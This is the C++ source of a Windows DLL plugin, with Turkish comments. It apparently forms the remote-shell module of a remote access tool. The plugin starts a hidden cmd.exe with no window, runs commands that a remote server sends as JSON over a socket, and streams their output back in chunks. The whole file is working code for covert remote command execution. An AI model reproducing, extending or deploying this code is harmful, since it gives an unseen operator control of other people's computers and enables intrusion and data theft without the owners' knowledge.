#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <algorithm>
#include <cctype>
#include <cstring>
#include <string>
#include "../../include/json.hpp"
#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;
using namespace std;

// ──────────────────────────────────────────────
//  Kalıcı CMD prosesi için global state
// ──────────────────────────────────────────────
static HANDLE g_hChildStdin_Rd  = NULL;
static HANDLE g_hChildStdin_Wr  = NULL;
static HANDLE g_hChildStdout_Rd = NULL;
static HANDLE g_hChildStdout_Wr = NULL;
static PROCESS_INFORMATION g_pi  = {};
static bool   g_shellRunning     = false;
static bool   g_insidePowerShell = false;

// Sentinel: her komuttan sonra output'un bittiğini anlamak için
static const char* SENTINEL        = "__CMD_DONE_A1B2C3__";
static const DWORD READ_TIMEOUT_MS = 20000;   // Server heartbeat'ten once donmek icin 20 sn
static const DWORD START_TIMEOUT_MS = 3000;   // Shell baslangicinda uzun bloklama yapma

// Büyük output'u parçalara bölerek gönder — client çökmesini önler
// 8 KB per chunk: JSON overhead + base64 olmadan güvenli sınır
static const size_t OUTPUT_CHUNK_SIZE = 8192;

static string ansi_to_utf8(const string& text) {
    if (text.empty()) return "";

    int wideLen = MultiByteToWideChar(CP_ACP, 0, text.c_str(), (int)text.size(), NULL, 0);
    if (wideLen <= 0)
        wideLen = MultiByteToWideChar(CP_OEMCP, 0, text.c_str(), (int)text.size(), NULL, 0);

    if (wideLen <= 0)
        return text;

    wstring wideText(wideLen, L'\0');
    if (MultiByteToWideChar(CP_ACP, 0, text.c_str(), (int)text.size(),
                            &wideText[0], wideLen) <= 0)
    {
        if (MultiByteToWideChar(CP_OEMCP, 0, text.c_str(), (int)text.size(),
                                &wideText[0], wideLen) <= 0)
            return text;
    }

    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideText.c_str(), wideLen, NULL, 0, NULL, NULL);
    if (utf8Len <= 0)
        return text;

    string utf8Text(utf8Len, '\0');
    if (WideCharToMultiByte(CP_UTF8, 0, wideText.c_str(), wideLen,
                            &utf8Text[0], utf8Len, NULL, NULL) <= 0)
        return text;

    return utf8Text;
}

static size_t utf8_chunk_length(const string& text, size_t offset, size_t maxLen) {
    size_t remaining = text.size() - offset;
    size_t len = min(maxLen, remaining);

    if (len == remaining)
        return len;

    while (len > 0 && ((unsigned char)text[offset + len] & 0xC0) == 0x80)
        len--;

    return len == 0 ? min(maxLen, remaining) : len;
}

static string strip_cmd_prompt_markers(const string& text) {
    string cleaned;
    cleaned.reserve(text.size());

    bool lineStart = true;
    for (size_t i = 0; i < text.size(); i++) {
        char ch = text[i];
        if (lineStart && ch == '>')
            continue;

        cleaned += ch;
        lineStart = (ch == '\n' || ch == '\r');
    }

    return cleaned;
}

static string trim_copy(const string& value) {
    size_t first = 0;
    while (first < value.size() && isspace((unsigned char)value[first])) first++;

    size_t last = value.size();
    while (last > first && isspace((unsigned char)value[last - 1])) last--;

    return value.substr(first, last - first);
}

static string lower_copy(string value) {
    transform(value.begin(), value.end(), value.begin(),
              [](unsigned char ch) { return (char)tolower(ch); });
    return value;
}

static bool is_bare_exit_command(const string& cmd) {
    string lower = lower_copy(trim_copy(cmd));
    return lower == "exit";
}

static bool starts_interactive_powershell(const string& cmd) {
    string lower = lower_copy(trim_copy(cmd));
    if (lower == "powershell" || lower == "powershell.exe")
        return true;

    if (lower.rfind("powershell ", 0) != 0 &&
        lower.rfind("powershell.exe ", 0) != 0)
        return false;

    return lower.find(" -command") == string::npos &&
           lower.find(" -c ") == string::npos &&
           lower.find(" -file") == string::npos &&
           lower.find(" -encodedcommand") == string::npos &&
           lower.find(" /?") == string::npos;
}

static string quote_cmd_path(string path) {
    path = trim_copy(path);
    if (path.size() >= 2 && path.front() == '"' && path.back() == '"')
        return path;

    path.erase(remove(path.begin(), path.end(), '"'), path.end());
    return "\"" + path + "\"";
}

static bool normalize_cd_command(const string& cmd, string& normalized) {
    string s = trim_copy(cmd);
    string lower = lower_copy(s);
    string rest;

    if (lower == "cd" || lower == "chdir") {
        normalized = "cd";
        return true;
    }

    if (lower == "cd..") {
        normalized = "cd /d \"..\"";
        return true;
    }

    if (lower.rfind("cd ", 0) == 0) {
        rest = trim_copy(s.substr(3));
    } else if (lower.rfind("chdir ", 0) == 0) {
        rest = trim_copy(s.substr(6));
    } else {
        return false;
    }

    if (rest.empty()) {
        normalized = "cd";
        return true;
    }

    string restLower = lower_copy(rest);
    if (restLower == "/?" || restLower.rfind("/? ", 0) == 0)
        return false;

    if (restLower == "/d") {
        normalized = "cd";
        return true;
    }

    if (restLower.rfind("/d ", 0) == 0)
        rest = trim_copy(rest.substr(3));

    if (rest.find('&') != string::npos || rest.find('|') != string::npos ||
        rest.find('<') != string::npos || rest.find('>') != string::npos)
        return false;

    replace(rest.begin(), rest.end(), '/', '\\');
    normalized = "cd /d " + quote_cmd_path(rest);
    return true;
}

// ──────────────────────────────────────────────
//  Yardımcı: CMD prosesi hâlâ canlı mı?
// ──────────────────────────────────────────────
static bool is_process_alive() {
    if (!g_pi.hProcess) return false;
    DWORD exitCode = STILL_ACTIVE;
    GetExitCodeProcess(g_pi.hProcess, &exitCode);
    return exitCode == STILL_ACTIVE;
}

static void terminate_process_tree(DWORD parentPid) {
    if (parentPid == 0)
        return;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return;

    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(pe);

    if (Process32First(snapshot, &pe)) {
        do {
            if (pe.th32ParentProcessID == parentPid) {
                terminate_process_tree(pe.th32ProcessID);

                HANDLE child = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pe.th32ProcessID);
                if (child) {
                    TerminateProcess(child, 0);
                    WaitForSingleObject(child, 500);
                    CloseHandle(child);
                }
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
}

// ──────────────────────────────────────────────
//  Yardımcı: tüm handle'ları kapat, state'i sıfırla
// ──────────────────────────────────────────────
static void cleanup_handles() {
    if (g_hChildStdin_Wr)  { CloseHandle(g_hChildStdin_Wr);  g_hChildStdin_Wr  = NULL; }
    if (g_hChildStdout_Rd) { CloseHandle(g_hChildStdout_Rd); g_hChildStdout_Rd = NULL; }
    if (g_hChildStdout_Wr) { CloseHandle(g_hChildStdout_Wr); g_hChildStdout_Wr = NULL; }
    if (g_hChildStdin_Rd)  { CloseHandle(g_hChildStdin_Rd);  g_hChildStdin_Rd  = NULL; }
    if (g_pi.hProcess)     { CloseHandle(g_pi.hProcess);     g_pi.hProcess     = NULL; }
    if (g_pi.hThread)      { CloseHandle(g_pi.hThread);      g_pi.hThread      = NULL; }
    g_shellRunning = false;
    g_insidePowerShell = false;
}

// ──────────────────────────────────────────────
//  Yardımcı: g_shellRunning'i proses durumuna göre güncelle
// ──────────────────────────────────────────────
static bool check_shell_alive() {
    if (!g_shellRunning) return false;
    if (!is_process_alive()) {
        cleanup_handles();
        return false;
    }
    return true;
}

// ──────────────────────────────────────────────
//  send() tamamlanana kadar döngüde gönder
// ──────────────────────────────────────────────
static bool safe_send_raw(SOCKET sock, const string& msg) {
    int total = 0;
    int len   = (int)msg.size();
    while (total < len) {
        int sent = send(sock, msg.c_str() + total, len - total, 0);
        if (sent == SOCKET_ERROR) return false;
        total += sent;
    }
    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

// ──────────────────────────────────────────────
//  Tek parça shellresponse gönder (kısa mesajlar için)
// ──────────────────────────────────────────────
static void send_shell_response(SOCKET sock,
                                const string& output,
                                const string& error  = "",
                                const string& status = "")
{
    json response;
    response["action"] = "shellresponse";
    response["final"]  = true;
    if (!status.empty())  response["status"] = status;
    if (!output.empty())  response["output"] = output;
    if (!error.empty())   response["error"]  = error;
    safe_send_json(sock, response);
}

// ──────────────────────────────────────────────
//  Büyük output'u chunk'lara bölerek gönder
//
//  Her chunk ayrı bir JSON mesajı olarak gider:
//    {"action":"shellresponse","output":"...","final":false}
//  Son chunk (veya tek chunk):
//    {"action":"shellresponse","output":"...","final":true,"status":"..."}
//
//  Client tarafı: final=false ise output'u biriktir,
//                 final=true  ise son chunk'ı ekle ve işle.
// ──────────────────────────────────────────────
static void send_chunked_output(SOCKET sock,
                                const string& output,
                                const string& status      = "",
                                const string& errorSuffix = "")
{
    string safeOutput = strip_cmd_prompt_markers(ansi_to_utf8(output));
    string safeErrorSuffix = strip_cmd_prompt_markers(ansi_to_utf8(errorSuffix));

    // Output boşsa veya küçükse tek parça gönder
    if (safeOutput.size() <= OUTPUT_CHUNK_SIZE && safeErrorSuffix.empty()) {
        send_shell_response(sock, safeOutput.empty() ? "(cikti yok)\r\n" : safeOutput,
                            "", status);
        return;
    }

    size_t offset = 0;
    size_t total  = safeOutput.size();

    // Output'u OUTPUT_CHUNK_SIZE'lık dilimler halinde gönder
    while (offset < total) {
        size_t chunkLen = utf8_chunk_length(safeOutput, offset, OUTPUT_CHUNK_SIZE);
        string chunk    = safeOutput.substr(offset, chunkLen);
        offset += chunkLen;

        bool isLast = (offset >= total) && safeErrorSuffix.empty();

        json msg;
        msg["action"] = "shellresponse";
        msg["output"] = chunk;
        msg["final"]  = isLast;
        if (isLast && !status.empty()) msg["status"] = status;
        safe_send_json(sock, msg);

        // Receiver'a nefes aldır — çok hızlı gönderirsek TCP buffer dolabilir
        if (!isLast) Sleep(5);
    }

    // Hata suffix'i varsa son parça olarak gönder
    if (!safeErrorSuffix.empty()) {
        json msg;
        msg["action"] = "shellresponse";
        msg["output"] = safeErrorSuffix;
        msg["final"]  = true;
        if (!status.empty()) msg["status"] = status;
        safe_send_json(sock, msg);
    }
}

// ──────────────────────────────────────────────
//  CMD prosesini başlat
// ──────────────────────────────────────────────
static bool start_cmd_process() {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength              = sizeof(sa);
    sa.bInheritHandle       = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // stdout pipe
    if (!CreatePipe(&g_hChildStdout_Rd, &g_hChildStdout_Wr, &sa, 0)) return false;
    SetHandleInformation(g_hChildStdout_Rd, HANDLE_FLAG_INHERIT, 0);

    // stdin pipe
    if (!CreatePipe(&g_hChildStdin_Rd, &g_hChildStdin_Wr, &sa, 0)) {
        CloseHandle(g_hChildStdout_Rd); g_hChildStdout_Rd = NULL;
        CloseHandle(g_hChildStdout_Wr); g_hChildStdout_Wr = NULL;
        return false;
    }
    SetHandleInformation(g_hChildStdin_Wr, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb          = sizeof(si);
    si.hStdOutput  = g_hChildStdout_Wr;
    si.hStdError   = g_hChildStdout_Wr;  // stderr de aynı pipe'a
    si.hStdInput   = g_hChildStdin_Rd;
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdLine[] = "cmd.exe /Q /A /D";  // /Q: echo off, /A: ANSI output, /D: AutoRun kapali
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &g_pi))
    {
        CloseHandle(g_hChildStdout_Rd); g_hChildStdout_Rd = NULL;
        CloseHandle(g_hChildStdout_Wr); g_hChildStdout_Wr = NULL;
        CloseHandle(g_hChildStdin_Rd);  g_hChildStdin_Rd  = NULL;
        CloseHandle(g_hChildStdin_Wr);  g_hChildStdin_Wr  = NULL;
        return false;
    }

    // Child'ın kopyaları artık gerekmez
    CloseHandle(g_hChildStdout_Wr); g_hChildStdout_Wr = NULL;
    CloseHandle(g_hChildStdin_Rd);  g_hChildStdin_Rd  = NULL;

    g_shellRunning = true;
    return true;
}

// ──────────────────────────────────────────────
//  CMD prosesini durdur — her zaman çalışır,
//  g_shellRunning false olsa bile handle varsa temizler
// ──────────────────────────────────────────────
static void stop_cmd_process() {
    // Nazikçe çıkmasını iste
    if (g_hChildStdin_Wr) {
        const char exitCmd[] = "exit\r\n";
        DWORD written = 0;
        WriteFile(g_hChildStdin_Wr, exitCmd, (DWORD)strlen(exitCmd), &written, NULL);
    }

    // 500 ms bekle, cikmazsa alt process'lerle birlikte zorla oldur
    if (g_pi.hProcess) {
        DWORD pid = g_pi.dwProcessId;
        if (WaitForSingleObject(g_pi.hProcess, 500) != WAIT_OBJECT_0) {
            terminate_process_tree(pid);
            TerminateProcess(g_pi.hProcess, 0);
            WaitForSingleObject(g_pi.hProcess, 500);
        }
    }

    cleanup_handles();
}

// ──────────────────────────────────────────────
//  Pipe'tan sentinel satırına kadar oku
// ──────────────────────────────────────────────
static string read_until_sentinel(bool& processEnded,
                                  DWORD timeoutMs = READ_TIMEOUT_MS,
                                  bool cleanupOnTimeout = true) {
    string result;
    char   buf[4096];
    DWORD  startTick = GetTickCount();
    processEnded = false;

    while (true) {
        // ── Timeout kontrolü ──
        if (GetTickCount() - startTick > timeoutMs) {
            if (cleanupOnTimeout) {
                result += "\r\n[TIMEOUT: komut zamaninda tamamlanamadi]\r\n";
                processEnded = true;
                stop_cmd_process();
            }
            break;
        }

        // ── Proses hayatta mı? ──
        if (!is_process_alive()) {
            // Kalan output'u oku (pipe'ta hâlâ veri olabilir)
            DWORD avail = 0;
            while (PeekNamedPipe(g_hChildStdout_Rd, NULL, 0, NULL, &avail, NULL)
                   && avail > 0)
            {
                DWORD toRead    = min((DWORD)(sizeof(buf) - 1), avail);
                DWORD bytesRead = 0;
                if (!ReadFile(g_hChildStdout_Rd, buf, toRead, &bytesRead, NULL)
                    || bytesRead == 0) break;
                buf[bytesRead] = '\0';
                result += buf;
            }
            processEnded = true;
            cleanup_handles();
            break;
        }

        DWORD bytesAvail = 0;
        BOOL  peekOk = PeekNamedPipe(g_hChildStdout_Rd, NULL, 0, NULL, &bytesAvail, NULL);
        if (!peekOk) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE || err == ERROR_NO_DATA) {
                processEnded = true;
                cleanup_handles();
            }
            break;
        }

        if (bytesAvail == 0) {
            Sleep(20);
            continue;
        }

        DWORD toRead    = min((DWORD)(sizeof(buf) - 1), bytesAvail);
        DWORD bytesRead = 0;
        BOOL  readOk    = ReadFile(g_hChildStdout_Rd, buf, toRead, &bytesRead, NULL);
        if (!readOk || bytesRead == 0) {
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                processEnded = true;
                cleanup_handles();
            }
            break;
        }
        buf[bytesRead] = '\0';
        result += buf;

        // Sentinel'i result içinde ara — chunk sınırında bölünse bile güvenli
        size_t pos = result.find(SENTINEL);
        if (pos != string::npos) {
            // Sentinel'in bulunduğu satırın başına kadar kes
            size_t lineStart = result.rfind('\n', pos);
            if (lineStart == string::npos) lineStart = 0;
            else lineStart++;  // '\n' dahil etme
            result = result.substr(0, lineStart);
            break;
        }
    }

    return result;
}

// ──────────────────────────────────────────────
//  Pipe'a komut yaz + sentinel ekle + çıktı oku
// ──────────────────────────────────────────────
static string run_command(const string& cmd, bool& processEnded) {
    processEnded = false;
    if (!check_shell_alive()) {
        processEnded = true;
        return "[Shell calismiyor]\r\n";
    }

    if (g_insidePowerShell && is_bare_exit_command(cmd)) {
        string full = "Write-Output \"" + string(SENTINEL) + "\"\r\nexit\r\n";
        DWORD written = 0;
        BOOL ok = WriteFile(g_hChildStdin_Wr, full.c_str(), (DWORD)full.size(), &written, NULL);
        if (!ok || written == 0) {
            processEnded = true;
            cleanup_handles();
            return "[PowerShell kapatilamadi: pipe hatasi]\r\n";
        }

        string output = read_until_sentinel(processEnded, 5000, false);
        g_insidePowerShell = false;
        if (output.empty())
            output = "[PowerShell oturumu kapatildi]\r\n";
        return output;
    }

    string commandToRun = cmd;
    string normalizedCd;
    bool isCdCommand = !g_insidePowerShell && normalize_cd_command(cmd, normalizedCd);
    if (isCdCommand)
        commandToRun = normalizedCd;

    string full = commandToRun + "\r\n";
    if (isCdCommand)
        full += "echo %CD%\r\n";
    full += "echo " + string(SENTINEL) + "\r\n";

    DWORD written = 0;
    BOOL ok = WriteFile(g_hChildStdin_Wr, full.c_str(), (DWORD)full.size(), &written, NULL);
    if (!ok || written == 0) {
        processEnded = true;
        cleanup_handles();
        return "[Komut gonderilemedi: pipe hatasi]\r\n";
    }

    string output = read_until_sentinel(processEnded);

    if (processEnded)
        g_insidePowerShell = false;
    else if (!g_insidePowerShell && starts_interactive_powershell(cmd))
        g_insidePowerShell = true;

    return output;
}

// ──────────────────────────────────────────────
//  İlk bağlantıda biriken prompt'u tüket
// ──────────────────────────────────────────────
static void flush_initial_prompt() {
    if (!g_hChildStdin_Wr) return;
    string flush = "prompt $G\r\necho " + string(SENTINEL) + "\r\n";
    DWORD written = 0;
    WriteFile(g_hChildStdin_Wr, flush.c_str(), (DWORD)flush.size(), &written, NULL);
    bool dummy = false;
    read_until_sentinel(dummy, START_TIMEOUT_MS, false);  // ciktiyi oku ve at
}

// ──────────────────────────────────────────────
//  Dışa açılan fonksiyonlar
// ──────────────────────────────────────────────
extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    // Her zaman önce eskiyi öldür, taze shell aç
    stop_cmd_process();
    if (start_cmd_process()) {
        flush_initial_prompt();
        send_shell_response(sock, "Shell hazir. Komut girebilirsiniz.\r\n", "", "started");
    } else {
        send_shell_response(sock, "", "CMD prosesi baslatılamadi.\r\n", "error");
    }
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        // ── shellstart ──
        // Her shellstart'ta eskiyi öldür, yeni CMD aç.
        // Sunucu tarafından "Remote Shell" butonuna her basıldığında
        // önceki oturum tamamen temizlenir, taze shell gelir.
        if (action == "shellstart") {
            stop_cmd_process();  // guard yok — her zaman çalış
            if (start_cmd_process()) {
                flush_initial_prompt();
                send_shell_response(sock, "Shell baslatildi.\r\n", "", "started");
            } else {
                send_shell_response(sock, "", "CMD baslatılamadi.\r\n", "error");
            }
            return;
        }

        // ── shellstop ──
        if (action == "shellstop") {
            stop_cmd_process();
            send_shell_response(sock, "Shell durduruldu.\r\n", "", "stopped");
            return;
        }

        // ── shellcommand ──
        if (action == "shellcommand") {
            if (!check_shell_alive()) {
                send_shell_response(sock, "",
                    "Shell calısmiyor. Once shellstart gonderin.\r\n");
                return;
            }

            string cmd = command.value("command", "");
            if (cmd.empty()) {
                send_shell_response(sock, "", "Bos komut.\r\n");
                return;
            }

            // exit intercept YOK — doğal davranış:
            // powershell/python içinde exit → CMD'ye döner (sentinel yakalanır)
            // CMD'den exit → proses kapanır → processEnded=true ile yakalanır

            bool   processEnded = false;
            string output       = run_command(cmd, processEnded);

            if (processEnded) {
                // CMD kapandı — output ne kadar büyük olursa olsun chunked gönder
                string suffix = "\r\n[Shell oturumu sona erdi. Yeni shell icin shellstart gonderin.]\r\n";
                send_chunked_output(sock, output, "stopped", suffix);
            } else {
                // Normal output — büyükse chunked, küçükse tek parça
                send_chunked_output(sock, output);
            }
            return;
        }

        send_shell_response(sock, "", "Bilinmeyen action.\r\n");

    } catch (const std::exception& e) {
        send_shell_response(sock, "", string("Parse hatasi: ") + e.what() + "\r\n");
    } catch (...) {
        send_shell_response(sock, "", "Parse hatasi.\r\n");
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) { return TRUE; }
